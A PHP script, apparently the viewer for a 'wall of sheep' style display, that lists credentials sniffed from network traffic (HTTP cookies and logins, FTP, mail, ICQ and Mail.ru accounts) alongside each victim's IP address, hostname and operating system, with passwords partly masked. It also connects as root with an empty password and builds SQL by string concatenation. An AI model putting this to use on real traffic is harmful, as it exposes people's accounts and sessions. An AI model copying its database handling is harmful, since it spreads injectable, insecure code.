<?php
include("contrib/smarty/Smarty.class.php");

$tpl = new Smarty();

$tpl->debugging = false;
$tpl->force_compile = true;
$tpl->caching = false;
$tpl->compile_check = true;
$tpl->cache_lifetime = -1;
$tpl->template_dir = "./tpl";
$tpl->compile_dir = "./tpl/compile";


$db_hostname = "localhost";
$db_username = "root";
$db_password = "";
$db_name = "wall"; 

mysql_connect($db_hostname, $db_username, $db_password) or die("Cannot connect to DB");
mysql_select_db($db_name) or die(mysql_error());  

$result = array();

/*
$q = <<<QUERY
        SELECT 'mru_cred' as `type`, `id`, `date` FROM `mru_cred` 
        UNION SELECT 'icq_cred' as `type`, `id`, `date` FROM `icq_cred`
        UNION SELECT 'pop_cred' as `type`, `id`, `date` FROM `pop_cred` 
        UNION SELECT 'smtp_cred' as `type`, `id`, `date` FROM `smtp_cred` 
        UNION SELECT 'imap_cred' as `type`, `id`, `date` FROM `imap_cred` 
        UNION SELECT 'ftp_cred' as `type`, `id`, `date` FROM `ftp_cred` 
        UNION SELECT 'http_login' as `type`, `id`, `date` FROM `http_login` 
        UNION SELECT 'http_auth_basic' as `type`, `id`, `date` FROM `http_auth_basic`
        UNION SELECT 'http_cookies' as `type`, `id`, `date` FROM `http_cookies`
        ORDER BY `date` DESC
QUERY;
*/

function screen_pass($pass) {
        $pass_first = substr($pass, 0, 3);
        $lpass = '';
        for($i=0; $i< strlen($pass)-3; $i++) {
                $lpass .= "*";
        }
        $rpass = $pass_first.$lpass;
        return $rpass;
}


mysql_query("set @num := 0, @ip := ''");
$q = <<<QUERY
        SELECT 'http_cookies' AS type, id, date FROM (SELECT id, ip, date, @num := if(@ip = ip, @num + 1, 1) AS row_number, @ip := ip AS dummy FROM http_cookies GROUP BY ip, host) AS x WHERE x.row_number <=20 
        UNION SELECT 'http_login' AS type, id, date FROM (SELECT id, ip, date, @num := if(@ip = ip, @num + 1, 1) AS row_number, @ip := ip AS dummy FROM http_login GROUP BY ip, host) AS x WHERE x.row_number <=10 
        UNION SELECT 'http_auth_basic' AS type, id, date FROM (SELECT id, ip, date, @num := if(@ip = ip, @num + 1, 1) AS row_number, @ip := ip AS dummy FROM http_auth_basic GROUP BY ip, host) AS x WHERE x.row_number <=10 
        UNION SELECT 'ftp_cred' AS type, id, date FROM (SELECT id, ip, date, @num := if(@ip = ip, @num + 1, 1) AS row_number, @ip := ip AS dummy FROM ftp_cred GROUP BY ip, host) AS x WHERE x.row_number <=5 
        UNION SELECT 'smtp_cred' AS type, id, date FROM (SELECT id, ip, date, @num := if(@ip = ip, @num + 1, 1) AS row_number, @ip := ip AS dummy FROM smtp_cred GROUP BY ip, host) AS x WHERE x.row_number <=5 
        UNION SELECT 'pop_cred' AS type, id, date FROM (SELECT id, ip, date, @num := if(@ip = ip, @num + 1, 1) AS row_number, @ip := ip AS dummy FROM pop_cred GROUP BY ip, host) AS x WHERE x.row_number <=5 
        UNION SELECT 'imap_cred' AS type, id, date FROM (SELECT id, ip, date, @num := if(@ip = ip, @num + 1, 1) AS row_number, @ip := ip AS dummy FROM imap_cred GROUP BY ip, host) AS x WHERE x.row_number <=5
        UNION SELECT 'icq_cred' as `type`, `id`, `date` FROM `icq_cred`
        UNION SELECT 'mru_cred' as `type`, `id`, `date` FROM `mru_cred`
        ORDER BY date ASC 
QUERY;

$r = mysql_query($q) or die(mysql_error()); 

$total_num = mysql_num_rows($r);
$tpl->assign("total_num", $total_num);

while ($item = mysql_fetch_array($r)) {

        $type = $item['type'];
        $id = $item['id'];
        $date = $item['date'];
        $value = '';

        $q = "SELECT * FROM ".$type." WHERE id='".$id."' LIMIT 1";
        $rs = mysql_query($q) or die(mysql_error());
        $ritem = mysql_fetch_array($rs);


        $ip = $ritem['ip'];

        if(isset($ritem['host'])) {
                $host = $ritem['host'];
                if(preg_match("/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/", $host)) {
                        $host = gethostbyaddr($host);
                }
        } else {
                $host = '-';
        }

        if(strlen($host) > 30) {
                $host = substr($host, 0, 50)."...";
        }

        switch($type) {
                case 'http_cookies':
                        $desc = 'HTTP Cookie';
                        $cparts = explode(';', $ritem['value']);
                        foreach($cparts as $part) {
                                if(strlen($part) > 50) {
                                        $part = substr($part, 0, 50)."...";
                                }
                                $value .= htmlspecialchars($part)."<br>";
                        }
                        //$value = $ritem['value'];
                        break;

                case 'http_auth_basic':
                        $desc = 'HTTP Basic';
                        $user = htmlspecialchars($ritem['user']);
                        $passwd = htmlspecialchars($ritem['passwd']);
                        $value = "Username: <b>".$user."</b><br>Password: ".screen_pass($passwd)."";
                        break;

                case 'http_login':
                        $desc = 'HTTP Login';
                        $user_field = htmlspecialchars($ritem['user_field']);
                        $user_value = htmlspecialchars($ritem['user_value']);
                        $passwd_field = htmlspecialchars($ritem['passwd_field']);
                        $passwd_value = htmlspecialchars($ritem['passwd_value']);
                        $value = "Username: <b>".$user_value."</b><br>Password: ".screen_pass($passwd_value);
                        break;

                case 'mru_cred':
                        $desc = 'Mail.RU Agent';
                        $user = htmlspecialchars($ritem['user']);
                        $pass = htmlspecialchars($ritem['pass']);
                        $value = "E-mail: <b>".$user."</b><br>Password: ".screen_pass($pass);
                        break;

                case 'icq_cred':
                        $desc = 'ICQ';
                        $user = htmlspecialchars($ritem['user']);
                        $pass = htmlspecialchars($ritem['pass']);
                        $value = "UIN: <b>".$user."</b><br>Password: ".screen_pass($pass);
                        break;

                case 'pop_cred':
                        $desc = 'POP3';
                        $user = htmlspecialchars($ritem['user']);
                        $pass = htmlspecialchars($ritem['pass']);
                        $value = "Username: <b>".$user."</b><br>Password: ".screen_pass($pass);
                        break;

                case 'ftp_cred':
                        $desc = 'FTP';
                        $user = htmlspecialchars($ritem['user']);
                        $pass = htmlspecialchars($ritem['pass']);
                        $value = "Username: <b>".$user."</b><br>Password: ".screen_pass($pass);
                        break;

                case 'imap_cred':
                        $desc = 'IMAP';
                        $user = htmlspecialchars($ritem['user']);
                        $pass = htmlspecialchars($ritem['pass']);
                        $value = "Username: <b>".$user."</b><br>Password: ".screen_pass($pass);
                        break;

                case 'smtp_cred':
                        $desc = 'SMTP';
                        $user = htmlspecialchars($ritem['user']);
                        $pass = htmlspecialchars($ritem['pass']);
                        $value = "Username: <b>".$user."</b><br>Password: ".screen_pass($pass);
                        break;
        }

        $q = "SELECT ip_os, ip_os_ver, ip_uptime FROM ips WHERE ip_addr='".$ip."' LIMIT 1";
        $rs = mysql_query($q) or die(mysql_error());
        if(mysql_num_rows($rs) > 0) {
                $ritem = mysql_fetch_array($rs);

                $ip_os = strtolower($ritem['ip_os']);
                if(substr_count($ip_os, '@') > 0) {
                        $ip_os = substr($ip_os, 1);
                }
                $ip_os_ver = $ritem['ip_os_ver'];
        } else {
                $ip_os = 'default';
                $ip_os_ver = '-';
        }

        $ip = long2ip($ip);

        $q = "SELECT count(*) as cnt FROM ips";
        $rs = mysql_query($q) or die(mysql_error());
        $ritem = mysql_fetch_array($rs);
        $ips_count = $ritem['cnt'];
        $tpl->assign("ips_count", $ips_count);


        $sens = array();
        $sens['date'] = $date;
        $sens['ip'] = $ip;
        $sens['os'] = $ip_os;
        $sens['desc'] = $desc;
        $sens['host'] = htmlspecialchars($host);
        $sens['value'] = $value;

        $result[] = $sens; 

}

$tpl->assign("result", $result);
$tpl->display("main.tpl");

?>
